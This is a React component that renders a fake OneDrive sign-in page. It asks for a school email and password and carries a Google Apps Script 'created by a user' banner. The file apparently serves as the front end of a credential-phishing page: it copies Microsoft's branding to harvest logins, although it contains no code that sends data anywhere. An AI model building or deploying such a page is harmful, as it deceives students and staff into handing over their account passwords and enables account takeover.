"use client";

import type React from "react";
import { useState } from "react";
import "./OneDriveLogin.css";

const OneDriveLogin: React.FC = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [showInfoBar, setShowInfoBar] = useState(true);

  return (
    <div className="onedrive-bg">
      {showInfoBar && (
        <div className="onedrive-infobar">
          <span className="onedrive-infoicon">ⓘ</span>
          <span>This application was created by a Google Apps Script user</span>
          <span className="onedrive-infobar-links">
            <a href="#report">Report abuse</a>
            <a href="#learn">Learn more</a>
            <button
              className="onedrive-close"
              onClick={() => setShowInfoBar(false)}
              aria-label="Close"
            >
              ✕
            </button>
          </span>
        </div>
      )}
      <div className="onedrive-container">
        <img
          src="/onedrive-logo.jpeg"
          alt="OneDrive"
          className="onedrive-logo"
        />
        <h1 className="onedrive-title">Sign In</h1>
        <form className="onedrive-form">
          <input
            type="email"
            placeholder="School Email"
            className="onedrive-input"
            required
          />
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            className="onedrive-input"
            required
          />
          <div className="onedrive-checkbox-row">
            <label>
              <input
                type="checkbox"
                checked={showPassword}
                onChange={() => setShowPassword((v) => !v)}
              />
              <span>Show Password</span>
            </label>
          </div>
          <div className="onedrive-checkbox-row">
            <label>
              <input type="checkbox" />
              <span>Remember Me</span>
            </label>
          </div>
          <button type="submit" className="onedrive-login-btn">
            Login
          </button>
        </form>
        <div className="onedrive-footer">
          By logging in, you accept our{" "}
          <a href="#terms">End User Terms of Use</a>
          <br />
          <a href="#forgot">Forgot Password?</a>
        </div>
      </div>
    </div>
  );
};

export default OneDriveLogin;
